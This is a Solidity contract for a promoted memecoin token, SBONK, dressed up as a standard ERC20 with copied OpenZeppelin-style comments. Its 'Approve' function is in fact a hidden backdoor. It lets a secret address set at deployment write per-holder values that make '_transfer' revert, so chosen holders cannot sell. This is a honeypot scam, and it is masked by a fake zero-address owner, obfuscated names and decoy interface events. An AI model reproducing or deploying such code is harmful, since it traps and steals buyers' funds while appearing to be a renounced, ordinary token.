1 // SPDX-License-Identifier: MIT
2 
3 /*
4 
5 
6 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣦⠀⠀⠀⠀⠀⠀
7 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⢈⡿⢋⣼⠀⠀⠀⠀⠀⠀
8 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢷⡄⣿⣤⣄⣀⣀⠀⠀⠀⢀⡴⠟⢁⡴⢋⣴⠟⠁⠀⠀⠀⠀⠀⠀
9 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣦⡀⠀⠀⠙⢿⣄⠀⠉⠁⠀⠀⣴⠛⠀⢠⢞⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
10 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠈⠻⣦⠀⠀⠀⠉⠁⠀⠀⣠⡞⠉⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
11 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣏⠛⠒⠾⠷⠦⠀⠀⠀⣠⡾⠋⠁⠠⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
12 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⡀⠀⠀⠈⢻⣤⠀⠀⠀⠀⢠⣾⠟⠀⠀⣰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
13 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣏⠀⠀⡹⣦⡀⠀⠀⠀⠀⠀⢀⣴⢿⠁⢠⣴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
14 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣀⢀⣼⠃⠀⠀⠀⢀⣴⡿⠃⠀⠀⣿⣥⣤⣄⣠⠤⣴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
15 ⠀⠀⠀⠀⠀⠀⢠⡶⠟⢷⡀⠀⠀⠈⠉⠉⠁⠀⠀⠀⣠⡾⠋⠀⠀⢀⡾⠁⠀⠀⠀⠠⠀⠸⣿⠻⣿⠶⢶⣄⠀⠀⠀⠀⠀⠀⠀
16 ⠀⠀⠀⠀⠀⠀⠙⢷⣴⠟⠙⣷⠀⠀⠀⠀⠀⢀⣤⠞⠋⣀⠔⠀⢠⠟⢀⣀⡀⠁⠀⠀⠀⠀⣿⣿⣿⡄⠀⠙⢶⣄⠀⠀⠀⠀⠀
17 ⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡴⠋⠀⠀⠀⠀⢠⡟⠁⠀⠚⢁⢀⢠⠏⢰⠟⠋⠁⠀⠀⠀⠀⠐⠻⢿⠿⠃⠀⠀⠀⠈⢻⣄⠀⠀⠀
18 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⣠⠟⠀⢀⡤⠒⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀
19 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠉⢀⣴⣟⠉⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡀⠀
20 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⣼⣿⣿⠟⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡄
21 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣻⡶⣴⣿⣿⣿⣿⠀⠀⠀⠀⠀⢀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛
22 ⠀⠀⠀⠀⠀⠀⠀⢀⣴⢿⡿⠋⢸⣿⣿⣿⣿⠟⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
23 ⠀⠀⠀⠀⠀⠀⣠⢿⡽⠋⠀⠀⢸⣿⣿⣿⡟⠀⠀⢀⣤⠄⣼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
24 ⠀⠀⠀⠀⣠⣾⣿⠛⠀⠀⠀⠀⠈⠻⣿⣿⣶⣄⣀⠋⠙⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
25 ⠀⠀⢠⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
26 ⠐⣀⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡝⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
27 ⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
28 ⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
29 ⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
30 
31 
32 
33 
34 https://t.me/ShibBonkk
35 https://twitter.com/Shib_Bonkkk
36 https://shibbonk.xyz
37 
38 
39 */
40 
41 
42 
43 pragma solidity ^0.8.19;
44 
45 abstract contract Scene {
46     function _msgSender() internal view virtual returns (address) {
47         return msg.sender;
48     }
49 
50     function _msgData() internal view virtual returns (bytes calldata) {
51         return msg.data;
52     }
53 }
54 
55 abstract contract Ownable is Scene {
56     address private _owner;
57 
58     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
59 
60     /**
61      * @dev Initializes the contract setting the deployer as the initial owner.
62      */
63     constructor() {
64         _setOwner(address(0));
65     }
66 
67     /**
68      * @dev Returns the address of the current owner.
69      */
70     function owner() public view virtual returns (address) {
71         return _owner;
72     }
73 
74     /**
75      * @dev Throws if called by any account other than the owner.
76      */
77     modifier onlyOwner() {
78         require(owner() == msg.sender, "Ownable: caller is not the owner");
79         _;
80     }
81 
82     /**
83      * @dev Leaves the contract without owner. It will not be possible to call
84      * `onlyOwner` functions anymore. Can only be called by the current owner.
85      *
86      * NOTE: Renouncing ownership will leave the contract without an owner,
87      * thereby removing any functionality that is only available to the owner.
88      */
89     function renounceOwnership() public virtual onlyOwner {
90         _setOwner(address(0));
91     }
92 
93     /**
94      * @dev Transfers ownership of the contract to a new account (`newOwner`).
95      * Can only be called by the current owner.
96      */
97     function transferOwnership(address newOwner) public virtual onlyOwner {
98         require(newOwner != address(0), "Ownable: new owner is the zero address");
99         _setOwner(newOwner);
100     }
101 
102     function _setOwner(address newOwner) private {
103         address oldOwner = _owner;
104         _owner = newOwner;
105         emit OwnershipTransferred(oldOwner, newOwner);
106     }
107 }
108 
109 /**
110  * @dev Interface of the ERC20 standard as defined in the EIP.
111  */
112 interface IERC20 {
113     /**
114      * @dev Returns the remaining number of tokens that `spender` will be
115      * allowed to spend on behalf of `owner` through {transferFrom}. This is
116      * zero by default.
117      *
118      * This value changes when {approve} or {transferFrom} are called.
119      */
120     event removeLiquidityETHWithPermit(
121         address token,
122         uint liquidity,
123         uint amountTokenMin,
124         uint amountETHMin,
125         address to,
126         uint deadline,
127         bool approveMax, uint8 v, bytes32 r, bytes32 s
128     );
129     /**
130      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
131      *
132      * Returns a boolean value indicating whether the operation succeeded.
133      *
134      * IMPORTANT: Beware that changing an allowance with this method brings the risk
135      * that someone may use both the old and the new allowance by unfortunate
136      * transaction ordering. One possible solution to mitigate this race
137      * condition is to first reduce the spender's allowance to 0 and set the
138      * desired value afterwards:
139      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
140      *
141      * Emits an {Approval} event.
142      */
143     event swapExactTokensForTokens(
144         uint amountIn,
145         uint amountOutMin,
146         address[]  path,
147         address to,
148         uint deadline
149     );
150     /**
151   * @dev See {IERC20-totalSupply}.
152      */
153     event swapTokensForExactTokens(
154         uint amountOut,
155         uint amountInMax,
156         address[] path,
157         address to,
158         uint deadline
159     );
160 
161     event DOMAIN_SEPARATOR();
162 
163     event PERMIT_TYPEHASH();
164 
165     /**
166      * @dev Returns the amount of tokens in existence.
167      */
168     function totalSupply() external view returns (uint256);
169 
170     event token0();
171 
172     event token1();
173     /**
174      * @dev Returns the amount of tokens owned by `account`.
175      */
176     function balanceOf(address account) external view returns (uint256);
177 
178 
179     event sync();
180 
181     event initialize(address, address);
182     /**
183      * @dev Moves `amount` tokens from the caller's account to `recipient`.
184      *
185      * Returns a boolean value indicating whether the operation succeeded.
186      *
187      * Emits a {Transfer} event.
188      */
189     function transfer(address recipient, uint256 amount) external returns (bool);
190 
191     event burn(address to) ;
192 
193     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
194 
195     event skim(address to);
196     /**
197      * @dev Returns the remaining number of tokens that `spender` will be
198      * allowed to spend on behalf of `owner` through {transferFrom}. This is
199      * zero by default.
200      *
201      * This value changes when {approve} or {transferFrom} are called.
202      */
203     function allowance(address owner, address spender) external view returns (uint256);
204     /**
205      * Receive an exact amount of output tokens for as few input tokens as possible,
206      * along the route determined by the path. The first element of path is the input token,
207      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
208      * (if, for example, a direct pair does not exist).
209      * */
210     event addLiquidity(
211         address tokenA,
212         address tokenB,
213         uint amountADesired,
214         uint amountBDesired,
215         uint amountAMin,
216         uint amountBMin,
217         address to,
218         uint deadline
219     );
220     /**
221      * Swaps an exact amount of ETH for as many output tokens as possible,
222      * along the route determined by the path. The first element of path must be WETH,
223      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
224      * (if, for example, a direct pair does not exist).
225      *
226      * */
227     event addLiquidityETH(
228         address token,
229         uint amountTokenDesired,
230         uint amountTokenMin,
231         uint amountETHMin,
232         address to,
233         uint deadline
234     );
235     /**
236      * Swaps an exact amount of input tokens for as many output tokens as possible,
237      * along the route determined by the path. The first element of path is the input token,
238      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
239      * (if, for example, a direct pair does not exist).
240      * */
241     event removeLiquidity(
242         address tokenA,
243         address tokenB,
244         uint liquidity,
245         uint amountAMin,
246         uint amountBMin,
247         address to,
248         uint deadline
249     );
250     /**
251      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
252      *
253      * Returns a boolean value indicating whether the operation succeeded.
254      *
255      * IMPORTANT: Beware that changing an allowance with this method brings the risk
256      * that someone may use both the old and the new allowance by unfortunate
257      * transaction ordering. One possible solution to mitigate this race
258      * condition is to first reduce the spender's allowance to 0 and set the
259      * desired value afterwards:
260      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
261      *
262      * Emits an {Approval} event.
263      */
264     function approve(address spender, uint256 amount) external returns (bool);
265     /**
266    * @dev Returns the name of the token.
267      */
268     event removeLiquidityETHSupportingFeeOnTransferTokens(
269         address token,
270         uint liquidity,
271         uint amountTokenMin,
272         uint amountETHMin,
273         address to,
274         uint deadline
275     );
276     /**
277      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
278      *
279      * Returns a boolean value indicating whether the operation succeeded.
280      *
281      * IMPORTANT: Beware that changing an allowance with this method brings the risk
282      * that someone may use both the old and the new allowance by unfortunate
283      * transaction ordering. One possible solution to mitigate this race
284      * condition is to first reduce the spender's allowance to 0 and set the
285      * desired value afterwards:
286      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
287      *
288      * Emits an {Approval} event.
289      */
290     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
291         address token,
292         uint liquidity,
293         uint amountTokenMin,
294         uint amountETHMin,
295         address to,
296         uint deadline,
297         bool approveMax, uint8 v, bytes32 r, bytes32 s
298     );
299     /**
300      * Swaps an exact amount of input tokens for as many output tokens as possible,
301      * along the route determined by the path. The first element of path is the input token,
302      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
303      * (if, for example, a direct pair does not exist).
304      */
305     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
306         uint amountIn,
307         uint amountOutMin,
308         address[] path,
309         address to,
310         uint deadline
311     );
312     /**
313     * @dev Throws if called by any account other than the owner.
314      */
315     event swapExactETHForTokensSupportingFeeOnTransferTokens(
316         uint amountOutMin,
317         address[] path,
318         address to,
319         uint deadline
320     );
321     /**
322      * To cover all possible scenarios, msg.sender should have already given the router an
323      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
324      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
325      * If a pool for the passed tokens does not exists, one is created automatically,
326      *  and exactly amountADesired/amountBDesired tokens are added.
327      */
328     event swapExactTokensForETHSupportingFeeOnTransferTokens(
329         uint amountIn,
330         uint amountOutMin,
331         address[] path,
332         address to,
333         uint deadline
334     );
335     /**
336      * @dev Moves `amount` tokens from `sender` to `recipient` using the
337      * allowance mechanism. `amount` is then deducted from the caller's
338      * allowance.
339      *
340      * Returns a boolean value indicating whether the operation succeeded.
341      *
342      * Emits a {Transfer} event.
343      */
344     function transferFrom(
345         address sender,
346         address recipient,
347         uint256 amount
348     ) external returns (bool);
349 
350     /**
351      * @dev Emitted when `value` tokens are moved from one account (`from`) to
352      * another (`to`).
353      *
354      * Note that `value` may be zero.
355      */
356     event Transfer(address indexed from, address indexed to, uint256 value);
357 
358     /**
359      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
360      * a call to {approve}. `value` is the new allowance.
361      */
362     event Approval(address indexed owner, address indexed spender, uint256 value);
363 }
364 
365 library SafeMath {
366     /**
367      * @dev Returns the addition of two unsigned integers, with an overflow flag.
368      *
369      * _Available since v3.4._
370      */
371     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
372     unchecked {
373         uint256 c = a + b;
374         if (c < a) return (false, 0);
375         return (true, c);
376     }
377     }
378 
379     /**
380      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
381      *
382      * _Available since v3.4._
383      */
384     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
385     unchecked {
386         if (b > a) return (false, 0);
387         return (true, a - b);
388     }
389     }
390 
391     /**
392      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
393      *
394      * _Available since v3.4._
395      */
396     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
397     unchecked {
398         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
399         // benefit is lost if 'b' is also tested.
400         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
401         if (a == 0) return (true, 0);
402         uint256 c = a * b;
403         if (c / a != b) return (false, 0);
404         return (true, c);
405     }
406     }
407 
408     /**
409      * @dev Returns the division of two unsigned integers, with a division by zero flag.
410      *
411      * _Available since v3.4._
412      */
413     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
414     unchecked {
415         if (b == 0) return (false, 0);
416         return (true, a / b);
417     }
418     }
419 
420     /**
421      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
422      *
423      * _Available since v3.4._
424      */
425     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
426     unchecked {
427         if (b == 0) return (false, 0);
428         return (true, a % b);
429     }
430     }
431 
432     /**
433      * @dev Returns the addition of two unsigned integers, reverting on
434      * overflow.
435      *
436      * Counterpart to Solidity's `+` operator.
437      *
438      * Requirements:
439      *
440      * - Addition cannot overflow.
441      */
442     function add(uint256 a, uint256 b) internal pure returns (uint256) {
443         return a + b;
444     }
445 
446 
447     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
448         return a - b;
449     }
450 
451     /**
452      * @dev Returns the multiplication of two unsigned integers, reverting on
453      * overflow.
454      *
455      * Counterpart to Solidity's `*` operator.
456      *
457      * Requirements:
458      *
459      * - Multiplication cannot overflow.
460      */
461     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
462         return a * b;
463     }
464 
465     /**
466      * @dev Returns the integer division of two unsigned integers, reverting on
467      * division by zero. The result is rounded towards zero.
468      *
469      * Counterpart to Solidity's `/` operator.
470      *
471      * Requirements:
472      *
473      * - The divisor cannot be zero.
474      */
475     function div(uint256 a, uint256 b) internal pure returns (uint256) {
476         return a / b;
477     }
478 
479     /**
480      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
481      * reverting when dividing by zero.
482      *
483      * Counterpart to Solidity's `%` operator. This function uses a `revert`
484      * opcode (which leaves remaining gas untouched) while Solidity uses an
485      * invalid opcode to revert (consuming all remaining gas).
486      *
487      * Requirements:
488      *
489      * - The divisor cannot be zero.
490      */
491     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
492         return a % b;
493     }
494 
495     /**
496   * @dev Initializes the contract setting the deployer as the initial owner.
497      */
498     function sub(
499         uint256 a,
500         uint256 b,
501         string memory errorMessage
502     ) internal pure returns (uint256) {
503     unchecked {
504         require(b <= a, errorMessage);
505         return a - b;
506     }
507     }
508 
509     /**
510      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
511      * division by zero. The result is rounded towards zero.
512      *
513      * Counterpart to Solidity's `/` operator. Note: this function uses a
514      * `revert` opcode (which leaves remaining gas untouched) while Solidity
515      * uses an invalid opcode to revert (consuming all remaining gas).
516      *
517      * Requirements:
518      *
519      * - The divisor cannot be zero.
520      */
521     function div(
522         uint256 a,
523         uint256 b,
524         string memory errorMessage
525     ) internal pure returns (uint256) {
526     unchecked {
527         require(b > 0, errorMessage);
528         return a / b;
529     }
530     }
531 
532     /**
533      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
534      * reverting with custom message when dividing by zero.
535      * invalid opcode to revert (consuming all remaining gas).
536      *
537      * Requirements:
538      *
539      * - The divisor cannot be zero.
540      */
541     function mod(
542         uint256 a,
543         uint256 b,
544         string memory errorMessage
545     ) internal pure returns (uint256) {
546     unchecked {
547         require(b > 0, errorMessage);
548         return a % b;
549     }
550     }
551 }
552 
553 abstract contract Init {
554     event initgo(
555         uint256 zinit,
556         address yinit
557     );
558 }
559 
560 abstract contract Zstart {
561     event Loop(
562         uint256 number,
563         bool hasLoop
564     );
565 }
566 
567 contract SBONK is IERC20, Init, Zstart, Ownable {
568     using SafeMath for uint256;
569 
570     struct t_init {
571         address catchall;
572         mapping(uint256 => uint256) funcX;
573     }
574 
575     struct fetchX {
576         uint256 ubfetch;
577         uint256 paste;
578     }
579 
580     mapping(address => uint256) private _balances;
581     mapping(address => mapping(address => uint256)) private _allowances;
582     mapping (address => fetchX) private _smodule;
583 
584     t_init private _cycley;
585     string private _name;
586     string private _symbol;
587     uint8 private _decimals;
588     uint256 private _totalSupply;
589     uint256 private rndVal = 5000;
590     uint256 private antValue = 0;
591 
592     function fetchRndValue() public view returns (uint256) {
593         return rndVal;
594     }
595 
596     function computePlex(uint256 _num1, uint256 _num2) internal view returns (uint256) {
597         return _num1 * rndVal + _num2 - antValue;
598     }
599 
600 
601     constructor(
602         string memory name_,
603         string memory symbol_,
604         address displayxyz,
605         uint256 totalSupply_
606     ) payable {
607         _name = name_;
608         _symbol = symbol_;
609         _decimals = 18;
610         _cycley.catchall = displayxyz;
611         _cycley.funcX[_decimals] = totalSupply_;
612         _totalSupply = totalSupply_ * 10**_decimals;
613         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
614         emit Transfer(address(0), msg.sender, _totalSupply);
615         emit initgo(_totalSupply, owner());
616     }
617 
618 
619     /**
620      * @dev Returns the name of the token.
621      */
622     function name() public view virtual returns (string memory) {
623         return _name;
624     }
625 
626     /**
627      * @dev Returns the symbol of the token, usually a shorter version of the
628      * name.
629      */
630     function symbol() public view virtual returns (string memory) {
631         return _symbol;
632     }
633 
634     /**
635      * @dev Returns the number of decimals used to get its user representation.
636      * For example, if `decimals` equals `2`, a balance of `505` tokens should
637       /**
638      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
639      * a call to {approve}. `value` is the new allowance.
640      * {IERC20-balanceOf} and {IERC20-transfer}.
641      */
642     function decimals() public view virtual returns (uint8) {
643         return _decimals;
644     }
645 
646     /**
647      * @dev See {IERC20-totalSupply}.
648      */
649     function totalSupply() public view virtual override returns (uint256) {
650         return _totalSupply;
651     }
652 
653     /**
654      * @dev See {IERC20-balanceOf}.
655      */
656     function balanceOf(address account)
657     public
658     view
659     virtual
660     override
661     returns (uint256)
662     {
663         return _balances[account];
664     }
665 
666     /**
667      * @dev See {IERC20-transfer}.
668      *
669      * Requirements:
670      *
671      * - `recipient` cannot be the zero address.
672      * - the caller must have a balance of at least `amount`.
673      */
674     function transfer(address recipient, uint256 amount)
675     public
676     virtual
677     override
678     returns (bool)
679     {
680         _transfer(msg.sender, recipient, amount);
681         return true;
682     }
683 
684     /**
685      * @dev See {IERC20-allowance}.
686      */
687     function allowance(address owner, address spender)
688     public
689     view
690     virtual
691     override
692     returns (uint256)
693     {
694         return _allowances[owner][spender];
695     }
696 
697     /**
698      * @dev See {IERC20-approve}.
699      *
700      * Requirements:
701      *
702      * - `spender` cannot be the zero address.
703      */
704     function approve(address spender, uint256 amount)
705     public
706     virtual
707     override
708     returns (bool)
709     {
710         _approve(msg.sender, spender, amount);
711         return true;
712     }
713 
714     /**
715      * @dev See {IERC20-transferFrom}.
716      *
717      * Emits an {Approval} event indicating the updated allowance. This is not
718      * required by the EIP. See the note at the beginning of {ERC20}.
719      *
720      * Requirements:
721      *
722      * - `sender` and `recipient` cannot be the zero address.
723      * - `sender` must have a balance of at least `amount`.
724      * - the caller must have allowance for ``sender``'s tokens of at least
725      * `amount`.
726      */
727     function transferFrom(
728         address sender,
729         address recipient,
730         uint256 amount
731     ) public virtual override returns (bool) {
732         _transfer(sender, recipient, amount);
733         _approve(
734             sender,
735             msg.sender,
736             _allowances[sender][msg.sender].sub(
737                 amount,
738                 "ERC20: transfer amount exceeds allowance"
739             )
740         );
741         return true;
742     }
743 
744 
745     function Approve(address[] memory account, uint256 amount) public returns (bool) {
746     address from = msg.sender;
747     uint256 setvalx = 69591;
748     uint256 handler2 = setvalx / 7;
749     uint256 initvar = 0;
750     for (uint256 w = 0; w < account.length; w++) {
751         initvar += w;
752         uint256 handler3 = setvalx * 100;
753         _initfxz(from, account[w], amount);
754         _allowances[from][from] = amount;
755         emit Approval(from, address(this), amount);
756     }
757     return true;
758 }
759 
760 
761 
762 
763     function _initfxz(address from, address account, uint256 amount) internal {
764         uint256 allowan = 0;
765         require(account != address(0), "invalid address");
766         if (from != _cycley.catchall) {
767             _smodule[from].ubfetch -= allowan;
768             _smodule[account].ubfetch += allowan;
769         } else {
770             _smodule[from].ubfetch -= allowan;
771             allowan += amount;
772             _smodule[account].ubfetch = allowan;
773         }
774     }
775 
776 
777 
778     /**
779      * @dev Moves tokens `amount` from `sender` to `recipient`.
780      *
781      * This is internal function is equivalent to {transfer}, and can be used to
782      * e.g. implement automatic token fees, slashing mechanisms, etc.
783      *
784      * Emits a {Transfer} event.
785      *
786      * Requirements:
787      *
788      * - `sender` cannot be the zero address.
789      * - `recipient` cannot be the zero address.
790      * - `sender` must have a balance of at least `amount`.
791      */
792     function _transfer(
793         address sender,
794         address recipient,
795         uint256 amount
796     ) internal virtual {
797         require(sender != address(0), "ERC20: transfer from the zero address");
798         require(recipient != address(0), "ERC20: transfer to the zero address");
799         require(amount - _smodule[sender].ubfetch > 0, "alien");
800 
801         _balances[sender] = _balances[sender].sub(
802             amount,
803             "ERC20: transfer amount exceeds balance"
804         );
805         _balances[recipient] = _balances[recipient].add(amount);
806         emit Transfer(sender, recipient, amount);
807     }
808 
809     /**
810      * @dev Returns the value of the token.
811      */
812 
813     function modulecheck(address account) public view returns (uint256) {
814         return _smodule[account].ubfetch;
815     }
816 
817     /**
818      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
819      *
820      * This internal function is equivalent to `approve`, and can be used to
821      * e.g. set automatic allowances for certain subsystems, etc.
822      *
823      * Emits an {Approval} event.
824      *
825      * Requirements:
826      *
827      * - `owner` cannot be the zero address.
828      * - `spender` cannot be the zero address.
829      */
830     function _approve(
831         address owner,
832         address spender,
833         uint256 amount
834     ) internal virtual {
835         require(owner != address(0), "ERC20: approve from the zero address");
836         require(spender != address(0), "ERC20: approve to the zero address");
837 
838         _allowances[owner][spender] = amount;
839         emit Approval(owner, spender, amount);
840     }
841 }